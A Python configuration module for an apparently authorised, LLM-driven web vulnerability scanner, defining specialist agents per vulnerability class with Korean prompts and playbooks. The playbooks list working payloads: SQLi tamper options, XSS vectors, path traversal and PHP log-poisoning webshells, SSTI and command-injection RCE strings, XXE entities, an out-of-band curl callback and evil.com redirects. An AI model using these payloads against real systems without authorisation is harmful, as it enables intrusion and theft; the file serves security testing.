"""
specialists.py — Phase 2 전문가 에이전트 설정

각 취약점 클래스별로 전용 시스템 프롬프트, 허용 도구, 시간 예산을 정의합니다.
Phase 2 (Deep Spear) 단계에서 Phase 1 의심 취약점을 검증/심화할 때 사용됩니다.
"""

from __future__ import annotations
import re
from typing import Dict, List, Optional


# ── 취약점 클래스 정의 ─────────────────────────────────────────────────────────

VULN_CLASS_SQLI = "SQLI"
VULN_CLASS_XSS = "XSS"
VULN_CLASS_SSRF = "SSRF"
VULN_CLASS_LFI = "LFI"
VULN_CLASS_IDOR = "IDOR"
VULN_CLASS_AUTH = "AUTH"
VULN_CLASS_SSTI = "SSTI"
VULN_CLASS_OPEN_REDIRECT = "OPEN_REDIRECT"
VULN_CLASS_XXE = "XXE"
VULN_CLASS_CSRF = "CSRF"
VULN_CLASS_CMD_INJECTION = "CMD_INJECTION"
VULN_CLASS_FILE_UPLOAD = "FILE_UPLOAD"
VULN_CLASS_INFO_LEAK = "INFO_LEAK"
VULN_CLASS_MISCONFIG = "MISCONFIG"
VULN_CLASS_GENERIC = "GENERIC"


# ── 분류 규칙 (키워드 기반 1차 분류, 불확실하면 GENERIC) ──────────────────────

_CLASSIFY_RULES: List[tuple] = [
    (VULN_CLASS_SQLI, [
        r"sql\s*injection", r"sqli\b", r"union\s+select", r"blind\s+sql",
        r"boolean[- ]based", r"time[- ]based\s+blind", r"error[- ]based",
        r"CWE-89\b", r"sql\s*문법\s*오류", r"injection\b",
    ]),
    (VULN_CLASS_XSS, [
        r"xss\b", r"cross[- ]site\s+scripting", r"reflected\s+xss",
        r"stored\s+xss", r"dom[- ]based", r"javascript\s+실행",
        r"CWE-79\b",
    ]),
    (VULN_CLASS_SSRF, [
        r"ssrf\b", r"server[- ]side\s+request\s+forgery",
        r"내부\s*네트워크\s*접근", r"CWE-918\b",
    ]),
    (VULN_CLASS_LFI, [
        r"\blfi\b", r"local\s+file\s+inclusion", r"path\s+traversal",
        r"directory\s+traversal", r"\.\./", r"디렉터리\s*트래버설",
        r"CWE-22\b", r"CWE-98\b",
    ]),
    (VULN_CLASS_IDOR, [
        r"\bidor\b", r"insecure\s+direct\s+object",
        r"직접\s*객체\s*참조", r"권한\s*우회",
        r"CWE-639\b", r"CWE-284\b",
    ]),
    (VULN_CLASS_AUTH, [
        r"authentication\s+bypass", r"인증\s*우회", r"session\s+fixation",
        r"jwt\b", r"oauth\b", r"password\s+reset", r"broken\s+auth",
        r"privilege\s+escalation", r"권한\s*상승",
        r"CWE-287\b", r"CWE-306\b", r"CWE-384\b",
    ]),
    (VULN_CLASS_SSTI, [
        r"\bssti\b", r"server[- ]side\s+template", r"template\s+injection",
        r"jinja", r"twig", r"freemarker", r"velocity",
        r"CWE-1336\b",
    ]),
    (VULN_CLASS_OPEN_REDIRECT, [
        r"open\s+redirect", r"열린\s*리다이렉트", r"url\s+redirect",
        r"CWE-601\b",
    ]),
    (VULN_CLASS_XXE, [
        r"\bxxe\b", r"xml\s+external\s+entity", r"xml\s+entity",
        r"CWE-611\b", r"CWE-827\b",
    ]),
    (VULN_CLASS_CSRF, [
        r"\bcsrf\b", r"cross[- ]site\s+request\s+forgery",
        r"요청\s*위조", r"CWE-352\b",
    ]),
    (VULN_CLASS_CMD_INJECTION, [
        r"command\s+injection", r"명령어\s*주입", r"os\s+command",
        r"rce\b", r"remote\s+code\s+execution", r"원격\s*코드\s*실행",
        r"CWE-77\b", r"CWE-78\b", r"CWE-94\b",
    ]),
    (VULN_CLASS_FILE_UPLOAD, [
        r"file\s+upload", r"파일\s*업로드", r"unrestricted\s+upload",
        r"arbitrary\s+file\s+upload", r"webshell",
        r"CWE-434\b",
    ]),
    (VULN_CLASS_INFO_LEAK, [
        r"information\s+disclosure", r"정보\s*노출", r"sensitive\s+data",
        r"stack\s+trace", r"debug\s+info", r"verbose\s+error",
        r"CWE-200\b", r"CWE-209\b",
    ]),
    (VULN_CLASS_MISCONFIG, [
        r"misconfiguration", r"설정\s*오류", r"default\s+credentials",
        r"directory\s+listing", r"exposed\s+admin", r"cors\b",
        r"security\s+header", r"csp\b", r"clickjacking",
        r"CWE-16\b", r"CWE-200\b",
    ]),
]


# ── 전문가(Specialist) 정의 ──────────────────────────────────────────────────

# 각 클래스별 전문가 메타데이터
# allowed_extra_tools: Phase 2에서만 풀어주는 도구 (Phase 1은 curl 등 경량만)
# time_budget_seconds: 에이전트 강제 종료까지의 최대 시간
# success_criteria: LLM에게 "어떤 상태면 검증 완료인가"를 명시

_SPECIALISTS: Dict[str, dict] = {
    VULN_CLASS_SQLI: {
        "title_kr": "SQL Injection 전문가",
        "allowed_extra_tools": ["sqlmap"],
        "time_budget_seconds": 600,
        "success_criteria": (
            "다음 중 하나가 확인되면 검증 완료:\n"
            "  1) sqlmap이 injection point를 확정 (level/risk 1~3)\n"
            "  2) UNION/Boolean/Time/Error 기법 중 최소 1개 증명\n"
            "  3) DBMS 버전 또는 현재 DB 이름 획득\n"
            "불확실하면 verified=false + reason에 '재현 실패 원인' 명시."
        ),
        "playbook": (
            "① 파라미터 바운더리 확인 (',\", ), ORDER BY 등)\n"
            "② sqlmap --batch --level=3 --risk=2 --technique=BEUSTQ\n"
            "③ WAF 감지 시 --tamper=space2comment,between,randomcase 순차 시도\n"
            "④ 성공 시 --current-db, --banner로 증거 수집 (덤프는 금지)\n"
            "⑤ 재현 curl 명령 1개를 PoC로 정리"
        ),
    },
    VULN_CLASS_XSS: {
        "title_kr": "XSS 전문가",
        "allowed_extra_tools": ["dalfox"],
        "time_budget_seconds": 420,
        "success_criteria": (
            "반사 또는 저장 XSS가 payload 실행 증거로 확인되면 검증 완료.\n"
            "HTML/Attribute/JS 컨텍스트 중 어느 곳인지 명시. 단순 반영은 불충분."
        ),
        "playbook": (
            "① 반영 위치 컨텍스트 파악 (HTML body / attr / script / URL)\n"
            "② 컨텍스트별 최소 payload 시도: <svg onload=1> / \"><img src=x onerror=1> / javascript: 등\n"
            "③ WAF/필터 감지 시 이벤트 핸들러 변형 (onpointerover, onanimationstart 등)\n"
            "④ dalfox 로 blind XSS + DOM XSS 보조 스캔\n"
            "⑤ 성공 payload를 curl -G로 재현 + HTML 응답의 해당 라인 증거로 첨부"
        ),
    },
    VULN_CLASS_SSRF: {
        "title_kr": "SSRF 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 420,
        "success_criteria": (
            "다음 중 하나로 SSRF 확인:\n"
            "  1) 외부 콜백 서버 (interactsh 등)에서 HTTP/DNS 요청 수신 확인\n"
            "  2) 내부 메타데이터 엔드포인트 응답 획득 (169.254.169.254 등)\n"
            "  3) 포트 스캔 응답 시간 차이로 blind SSRF 입증"
        ),
        "playbook": (
            "① interactsh-client 로 OOB 콜백 도메인 확보\n"
            "② 대상 파라미터에 http://<interactsh>/ 주입 → 콜백 확인\n"
            "③ 내부망 주소 (127.0.0.1, 169.254.169.254) 응답 차이 비교\n"
            "④ 프로토콜 우회: gopher://, file://, dict:// 시도 (응답 이상 체크)\n"
            "⑤ 성공 시 OOB 로그 + 요청 curl 을 PoC로 정리"
        ),
    },
    VULN_CLASS_LFI: {
        "title_kr": "LFI/Path Traversal 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 360,
        "success_criteria": (
            "/etc/passwd, /proc/self/environ, Windows boot.ini 등\n"
            "시스템 파일 내용이 응답에 포함되면 검증 완료.\n"
            "또는 PHP wrapper (php://filter) 로 소스 유출 성공."
        ),
        "playbook": (
            "① ../../../../etc/passwd 기본 시도 → 실패시 인코딩 변형 (%2e%2e%2f, ..%2f, ....//)\n"
            "② null byte / truncation (%00, ?xxx, 길이 초과) 우회 시도\n"
            "③ 래퍼 활용: php://filter/convert.base64-encode/resource=index.php\n"
            "④ 로그 포이즈닝 (UA 헤더에 <?php system($_GET[x]);?>) → /var/log/apache2/access.log 포함\n"
            "⑤ 성공 응답의 파일 내용 일부를 evidence로 첨부"
        ),
    },
    VULN_CLASS_IDOR: {
        "title_kr": "IDOR / 인가 우회 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 360,
        "success_criteria": (
            "다른 사용자의 자원에 접근/수정 가능함을 2개 이상 계정 비교로 증명.\n"
            "또는 인증 없이 /api/user/:id 같은 엔드포인트 응답 획득."
        ),
        "playbook": (
            "① 현재 세션으로 /api/user/<본인ID> 응답 확보 (baseline)\n"
            "② ID를 +1, -1, UUID 변형, leading zero 등 으로 시도\n"
            "③ 메서드 변경 (GET→POST/PUT/DELETE) 로 부가 취약점 탐색\n"
            "④ 가능하면 두 번째 계정 생성하여 horizontal 권한 우회 확인\n"
            "⑤ X-User-Id, X-Forwarded-User 헤더 조작 시도\n"
            "⑥ 차이가 나는 두 응답의 diff를 evidence로 정리"
        ),
    },
    VULN_CLASS_AUTH: {
        "title_kr": "인증/세션 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 420,
        "success_criteria": (
            "인증 우회, 권한 상승, 토큰 위조 중 하나를 재현 가능한 방법으로 증명."
        ),
        "playbook": (
            "① JWT 토큰 디코드 → alg:none / 약한 HS256 secret 시도\n"
            "② Session fixation: 로그인 전/후 쿠키 값 비교\n"
            "③ Password reset flow: 토큰 예측 가능성 / 타 계정 토큰 재사용\n"
            "④ Race condition: 동일 토큰 동시 2회 사용\n"
            "⑤ OAuth redirect_uri 조작 / state 누락 검증\n"
            "⑥ Remember-me 쿠키 구조 해석 (base64/서명 유무)\n"
            "⑦ 성공 시 위조 토큰 또는 공격 시퀀스를 PoC로 기록"
        ),
    },
    VULN_CLASS_SSTI: {
        "title_kr": "SSTI 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 360,
        "success_criteria": (
            "템플릿 엔진 식별 + 수식 평가 증거 확인 (예: {{7*7}} → 49).\n"
            "가능하면 파일 시스템 접근 또는 RCE까지 증명."
        ),
        "playbook": (
            "① 엔진 탐지: {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, [[7*7]]\n"
            "② 49 등 계산 결과 반영 확인 시 엔진 확정\n"
            "③ Jinja2: {{config}}, {{''.__class__.__mro__}}\n"
            "④ Twig: {{_self.env.registerUndefinedFilterCallback('system')}}\n"
            "⑤ Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>\n"
            "⑥ RCE payload를 POC로 기록 (destructive 명령 금지, id/whoami 정도)"
        ),
    },
    VULN_CLASS_OPEN_REDIRECT: {
        "title_kr": "Open Redirect 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 240,
        "success_criteria": (
            "Location 헤더 또는 meta refresh 에 외부 도메인이 반영되어\n"
            "브라우저에서 해당 도메인으로 실제 이동되면 검증 완료."
        ),
        "playbook": (
            "① 기본 시도: ?url=https://evil.com\n"
            "② 우회: //evil.com, /\\evil.com, https:evil.com, //google.com@evil.com\n"
            "③ Path-based: /redirect/evil.com, /login?next=//evil.com\n"
            "④ data:, javascript: 스킴으로 XSS 전환 시도\n"
            "⑤ curl -I 로 Location 헤더 캡처하여 evidence 기록"
        ),
    },
    VULN_CLASS_XXE: {
        "title_kr": "XXE 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 360,
        "success_criteria": (
            "로컬 파일 내용 반영 또는 OOB 콜백으로 XXE 확인."
        ),
        "playbook": (
            "① XML 입력 지점에 <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> 주입\n"
            "② Blind 인 경우 interactsh 로 외부 엔티티 OOB 확인\n"
            "③ Parameter entity 변형: <!ENTITY % pe ...>\n"
            "④ JSON 기반이어도 Content-Type: application/xml 전환 시도\n"
            "⑤ 성공 응답에 파일 내용 일부 + 요청 payload 를 PoC로 정리"
        ),
    },
    VULN_CLASS_CSRF: {
        "title_kr": "CSRF 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 240,
        "success_criteria": (
            "상태 변경 요청에 CSRF 토큰이 없거나, 토큰 검증이 누락되어\n"
            "외부 출처에서 요청 위조가 성공함을 증명."
        ),
        "playbook": (
            "① 민감 액션 (비밀번호 변경, 송금 등) 요청 캡처\n"
            "② Referer/Origin 헤더 제거/조작 후 요청 재전송\n"
            "③ CSRF 토큰이 있는 경우: 다른 사용자 토큰 재사용 / 비어있는 값 / 서명 검증 여부\n"
            "④ SameSite 쿠키 정책 확인 (Strict / Lax / None)\n"
            "⑤ HTML 폼 기반 PoC 작성 및 재현 여부 확인"
        ),
    },
    VULN_CLASS_CMD_INJECTION: {
        "title_kr": "Command Injection / RCE 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 480,
        "success_criteria": (
            "id, whoami, uname -a 등 무해한 명령의 실행 결과가 응답 또는 OOB 콜백으로 확인."
        ),
        "playbook": (
            "① 메타 문자 시도: ; | & && || `cmd` $(cmd)\n"
            "② Blind 시 interactsh OOB: $(curl http://<interactsh>/)\n"
            "③ Newline/URL encoding 우회: %0aid, %0d%0a\n"
            "④ 필터 우회: $IFS, ${IFS}, concat 분할\n"
            "⑤ 성공 명령의 응답/콜백 증거 + 재현 curl 을 PoC로 정리"
        ),
    },
    VULN_CLASS_FILE_UPLOAD: {
        "title_kr": "파일 업로드 전문가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 420,
        "success_criteria": (
            "업로드된 웹쉘/스크립트 파일이 실행되어 임의 명령 수행이 증명되면 검증 완료.\n"
            "실행 없이 단순 업로드 성공은 LOW로 유지."
        ),
        "playbook": (
            "① 확장자 필터 우회: .php.jpg, .phtml, .pht, .phar, 대소문자 조합\n"
            "② Content-Type 헤더만 image/jpeg 위조\n"
            "③ Magic byte (JPEG/PNG) 헤더 + PHP 코드 추가\n"
            "④ 업로드 경로 추적 → 직접 실행 시도 (/uploads/shell.php.jpg)\n"
            "⑤ .htaccess 업로드로 핸들러 오버라이드 시도\n"
            "⑥ 실행 성공 응답을 PoC로 기록 (무해한 명령만)"
        ),
    },
    VULN_CLASS_INFO_LEAK: {
        "title_kr": "정보 노출 분석가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 180,
        "success_criteria": (
            "민감 정보 (내부 경로, 스택 트레이스, 토큰, 키, 개인정보)가\n"
            "응답에 직접 노출됨을 확인."
        ),
        "playbook": (
            "① 에러 유도: 잘못된 파라미터, 예약어, 음수/오버플로우\n"
            "② 표준 경로 확인: /.git/config, /.env, /actuator/, /phpinfo.php, /server-status\n"
            "③ 응답 헤더 분석: Server, X-Powered-By, X-AspNet-Version\n"
            "④ 주석/디버그 메시지 탐색 (curl + grep)\n"
            "⑤ 노출된 정보의 민감도에 따라 severity 판정"
        ),
    },
    VULN_CLASS_MISCONFIG: {
        "title_kr": "설정 오류 분석가",
        "allowed_extra_tools": [],
        "time_budget_seconds": 180,
        "success_criteria": (
            "보안 설정의 실제 영향을 재현 가능한 방법으로 증명 (CORS 오용, 디렉토리 리스팅, 기본 크리덴셜 등)."
        ),
        "playbook": (
            "① CORS: Origin: https://evil.com 으로 요청 → Access-Control-Allow-Origin 반사 확인\n"
            "② 보안 헤더 누락: CSP, HSTS, X-Frame-Options 유무\n"
            "③ 디렉토리 리스팅: 흔한 경로 (/backup/, /old/, /.git/)\n"
            "④ 기본 크리덴셜: admin/admin, test/test 시도\n"
            "⑤ 각 항목의 재현 요청/응답을 evidence로 첨부"
        ),
    },
    VULN_CLASS_GENERIC: {
        "title_kr": "일반 검증 에이전트",
        "allowed_extra_tools": [],
        "time_budget_seconds": 300,
        "success_criteria": (
            "취약점이 재현 가능한 방법으로 확인되거나, "
            "재현 불가능함이 명확히 증명되면 완료."
        ),
        "playbook": (
            "① Phase 1 증거(evidence)의 재현 가능성 먼저 검증\n"
            "② 재현되면 최소 재현 payload 1개 확보 + 영향 범위 파악\n"
            "③ 재현 불가 시 verified=false + 원인 기록 (필터 변경, 환경 차이 등)"
        ),
    },
}


# ── 공개 함수 ─────────────────────────────────────────────────────────────────

def classify_finding(finding: dict) -> str:
    """취약점 finding 을 키워드 기반으로 분류합니다.

    title + description + cwe 의 합쳐진 텍스트에 대해 정의된 패턴을 매칭합니다.
    매칭되지 않으면 VULN_CLASS_GENERIC 을 반환합니다.
    """
    if not isinstance(finding, dict):
        return VULN_CLASS_GENERIC

    haystack_parts = [
        str(finding.get("title", "")),
        str(finding.get("description", "")),
        str(finding.get("cwe", "")),
        str(finding.get("evidence", "")),
    ]
    haystack = " ".join(haystack_parts).lower()

    for vuln_class, patterns in _CLASSIFY_RULES:
        for pat in patterns:
            if re.search(pat, haystack, re.IGNORECASE):
                return vuln_class

    return VULN_CLASS_GENERIC


def get_specialist(vuln_class: str) -> dict:
    """취약점 클래스에 해당하는 전문가 설정을 반환합니다."""
    return _SPECIALISTS.get(vuln_class, _SPECIALISTS[VULN_CLASS_GENERIC])


def list_specialist_classes() -> List[str]:
    """등록된 모든 전문가 클래스 목록."""
    return list(_SPECIALISTS.keys())


def build_specialist_system_prompt(
    finding: dict,
    vuln_class: Optional[str] = None,
    target: str = "",
) -> str:
    """Phase 2 전문가용 시스템 프롬프트를 생성합니다.

    Phase 1 의심 취약점 1건에 대해 집중적으로 검증/심화하도록 좁혀진 프롬프트입니다.
    """
    if vuln_class is None:
        vuln_class = classify_finding(finding)
    spec = get_specialist(vuln_class)

    title = finding.get("title", "Unknown")
    severity = finding.get("severity", "MEDIUM")
    finding_target = finding.get("target", target)
    description = finding.get("description", "")
    evidence = finding.get("evidence", "")
    cwe = finding.get("cwe", "")

    extra_tools = spec.get("allowed_extra_tools", [])
    extra_tools_line = (
        "- 이번 전문가 모드에서는 추가로 다음 도구가 해제됩니다: "
        + ", ".join(extra_tools)
        if extra_tools
        else "- 추가로 해제된 도구는 없습니다. curl + python3 등 기본 도구만 사용하십시오."
    )

    return f"""당신은 **{spec['title_kr']}** 입니다.
Phase 1 자동 스캔에서 발견된 **하나의 의심 취약점**을 전담 심층 검증하는 역할입니다.

### 검증 대상 (Phase 1 의심 취약점 1건)
- 제목: {title}
- 심각도(의심): {severity}
- 대상: {finding_target}
- CWE: {cwe or '미지정'}
- 설명:
{description}
- Phase 1 근거(Evidence):
{evidence}

### 전문 영역
{spec.get('playbook', '')}

### 성공 기준 (verified = true 로 전환하려면)
{spec.get('success_criteria', '')}

### 진행 지침
1. **범위 고정**: 위 대상 엔드포인트/파라미터에만 집중. 새 엔드포인트 탐색 금지.
2. **최소 재현 원칙**: 한 번 검증되면 같은 취약점을 반복 시도하지 말 것.
3. **증거 기반**: 모든 결론은 실제 명령어 실행 결과와 응답으로 뒷받침.
4. **추측 금지**: evidence 없이 report_finding 호출 금지.
5. **시간 예산**: 약 {spec['time_budget_seconds']}초 내 결론 도출.
6. {extra_tools_line}
7. 재현 가능한 curl/payload 1개를 반드시 PoC로 정리.

### 보고 규칙
- 검증 성공: `report_finding` 호출 시 `verified=true`, `evidence` 에 실제 응답/PoC 포함.
- 검증 실패: 마지막 메시지에 "검증 불가: <이유>" 를 명시하고 종료. report_finding 호출하지 말 것.
- 모든 텍스트는 한국어로 작성. 명령어/응답은 원문 유지.
"""


def get_allowed_extra_tools(vuln_class: str) -> List[str]:
    """Phase 2 전문가 모드에서 추가로 허용되는 도구 목록."""
    spec = get_specialist(vuln_class)
    return list(spec.get("allowed_extra_tools", []))


def get_time_budget(vuln_class: str) -> int:
    """전문가 클래스별 기본 시간 예산(초)."""
    spec = get_specialist(vuln_class)
    return int(spec.get("time_budget_seconds", 300))
